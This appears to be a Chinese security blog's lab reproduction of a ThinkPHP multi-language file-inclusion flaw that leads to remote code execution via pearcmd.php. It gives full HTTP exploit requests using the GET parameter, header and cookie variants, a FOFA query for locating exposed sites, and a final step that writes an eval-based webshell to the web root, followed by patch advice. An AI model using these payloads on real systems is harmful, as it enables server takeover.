#### 免责声明

#### 本文章只用于技术交流，若使用本文章提供的技术信息进行非法操作，后果均由使用者本人负责。

## 漏洞描述：

ThinkPHP在开启多语言功能的情况下存在文件包含漏洞，攻击者可以通过get、header、cookie等位置传入参数，实现目录穿越+文件包含，通过pearcmd文件包含这个trick即可实现RCE。

## 影响版本：

6.0.1 < ThinkPHP≤ 6.0.13

5.0.0 < ThinkPHP≤ 5.0.12

5.1.0 < ThinkPHP≤ 5.1.8

## 利用条件：

> 1、需要Thinkphp开启多语言功能
>
> 2、安装pear扩展
>
> 3、知道pearcmd.php路径
>
> 4、register_argc_argv=on

## FOFA搜索语法：

> header="think_lang"

## 环境搭建：

服务器首先要有docker环境，没有的可以先部署一个

#### 1、docker直接拉取vulfocus 的thinkphp:6.0.12的漏洞环境镜像：

    
    
    docker pull vulfocus/thinkphp:6.0.12

#### 2、启动容器，将容器的80端口映射到本机的80端口

    
    
    docker run  --nametp123 -p80:80 -d镜像id

浏览器访问：ip+/public/index.php 如下图则搭建成功：

![](https://image.3001.net/images/20221213/1670914720_639822a066dcdb34ed5e7.png!small)

## 漏洞复现：

pearcmd.php这个文件的一些具体细节可以参考这篇文章

<https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp>

进入容器查看pearcmd.php路径，执行 ````

    
    
    find / -name pearcmd.php 2>/dev/null

``

    
    
    /usr/local/lib/php/pearcmd.php

![](https://image.3001.net/images/20221213/1670914721_639822a159a5ebd32c940.png!small)

### EXP：

##### 在/tmp/下生成hello.php

    
    
    GET /public/index.php?+config-create+/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1  
    Host: 192.168.36.128  
    Cache-Control: max-age=0  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Language: zh-CN,zh;q=0.9  
    think-lang:../../../../../../../../usr/local/lib/php/pearcmd  
    Cookie: think_lang=zh-cn  
    Connection: close

##### 进入容器查看/tmp/hellp.php

![](https://image.3001.net/images/20221213/1670914722_639822a217ef66eb74c3b.png!small)

##### 包含hello.php

    
    
    GET /public/index.php HTTP/1.1  
    Host: 192.168.36.128  
    Cache-Control: max-age=0  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Language: zh-CN,zh;q=0.9  
    think-lang:../../../../../../../../tmp/hello  
    Cookie: think_lang=zh-cn  
    Connection: close

##### repeater发包：

![](https://image.3001.net/images/20221213/1670914723_639822a351cac8f0bc81c.png!small)

##### 看看浏览器页面成功执行phpinfo：

![](https://image.3001.net/images/20221213/1670914726_639822a6bef1914ee2c57.png!small)

### GET：

直接利用p牛文章中的请求包，需要根据实际情况改变文件名称，写不进去可以考虑多加点../

##### 创建文件

    
    
    GET /public/index.php?lang=../../../../../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=phpinfo()?>+/tmp/1.php HTTP/1.1  
    Host: 192.168.36.128  
    Cache-Control: max-age=0  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Language: zh-CN,zh;q=0.9  
    Cookie: think_lang=zh-cn  
    Connection: close

##### repeater发包：

![](https://image.3001.net/images/20221213/1670914729_639822a9018b9f2f6d402.png!small)

##### 进入容器查看：

![](https://image.3001.net/images/20221213/1670914731_639822abd7880f187686b.png!small)

##### 文件包含/tmp/1.php

    
    
    GET /public/index.php?lang=../../../../../../../../../../../../tmp/1 HTTP/1.1  
    Host: 192.168.36.128  
    Cache-Control: max-age=0  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Language: zh-CN,zh;q=0.9  
    Cookie: think_lang=zh-cn  
    Connection: close

##### repeater发包：

![](https://image.3001.net/images/20221213/1670914733_639822ad4417aede56005.png!small)

##### 再看看浏览器页面，成功执行phpinfo：

![](https://image.3001.net/images/20221213/1670914737_639822b13fd0cacbf0b02.png!small)

### HEADER：

##### 创建文件

    
    
    GET /public/index.php?+config-create+/&/<?=phpinfo()?>+/tmp/2.php HTTP/1.1  
    Host: 192.168.36.128  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Language: zh-CN,zh;q=0.9  
    think-lang:../../../../../../../../../../../../../../usr/local/lib/php/pearcmd  
    Cookie: think_lang=zh-cn  
    Connection: close

##### repeater发包：

![](https://image.3001.net/images/20221213/1670914739_639822b369a58bf25fc74.png!small)

##### 进入容器查看：

![](https://image.3001.net/images/20221213/1670914742_639822b6a5e47f750c5b8.png!small)

##### 文件包含/tmp/2.php

    
    
    GET /public/index.php?lang=../../../../../../../../../../../../tmp/2 HTTP/1.1  
    Host: 192.168.36.128  
    Cache-Control: max-age=0  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Language: zh-CN,zh;q=0.9  
    Cookie: think_lang=zh-cn  
    Connection: close

##### repeater发包：

![](https://image.3001.net/images/20221213/1670914744_639822b821a382b5e71de.png!small)

##### 在看看浏览器页面成功执行phpinfo：

![](https://image.3001.net/images/20221213/1670914746_639822ba3a3211bf85b7d.png!small)

## COOKIES：

##### 创建文件

    
    
    GET /public/index.php?+config-create+/&/<?=phpinfo()?>+/tmp/3.php HTTP/1.1  
    Host: 192.168.36.128  
    Cache-Control: max-age=0  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Language: zh-CN,zh;q=0.9  
    Cookie: think_lang=../../../../../../../../../../../../../../usr/local/lib/php/pearcmd  
    Connection: close

##### repeater发包：

![](https://image.3001.net/images/20221213/1670914749_639822bd2a95e7da063e6.png!small)

##### 进入容器查看：

![](https://image.3001.net/images/20221213/1670914752_639822c0ac76ca3844442.png!small)

##### 文件包含/tmp/3.php

    
    
    GET /public/index.php?lang=../../../../../../../../../../../../tmp/3 HTTP/1.1  
    Host: 192.168.36.128  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36  
    Sec-Purpose: prefetch;prerender  
    Purpose: prefetch  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Language: zh-CN,zh;q=0.9  
    Cookie: think_lang=zh-cn  
    Connection: close

##### repeater发包：

![](https://image.3001.net/images/20221213/1670914753_639822c1f217f93929602.png!small)

##### 在看看浏览器页面成功执行phpinfo：

![](https://image.3001.net/images/20221213/1670914757_639822c58199fed72db24.png!small)

### GETSHELL

#### 于是我梅开二度决定写入一个马子试试：

这次我们直接写到网站根目录（注：phpinfo可以查看网站绝对路径）

![](https://image.3001.net/images/20221213/1670914759_639822c7079050f83f018.png!small)

##### 写入文件

    
    
    GET /public/index.php?lang=../../../../../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=@eval($_POST['cmd']);?>+/var/www/html/shell.php HTTP/1.1  
    Host: 192.168.36.128  
    Cache-Control: max-age=0  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Language: zh-CN,zh;q=0.9  
    Cookie: think_lang=zh-cn  
    Connection: close

##### repeater发包：

![](https://image.3001.net/images/20221213/1670914762_639822ca3844f4b923ca7.png!small)

##### 浏览器访问：

![](https://image.3001.net/images/20221213/1670914766_639822ce7a2baab9c6c55.png!small)

##### 蚁剑成功连接：

![](https://image.3001.net/images/20221213/1670914767_639822cfbb1e557337cdf.png!small)

## 修复建议：

1、若无必要，可关闭多语言功能，可参考文档

<https://www.kancloud.cn/manual/thinkphp6_0/1037637>

<https://static.kancloud.cn/manual/thinkphp5/118132>

2、官方已发布6.0.14、5.1.42，建议升级至安全版本，链接如下：

[https://github.com/top-think/framework/tags﻿](https://github.com/top-think/framework/tags)

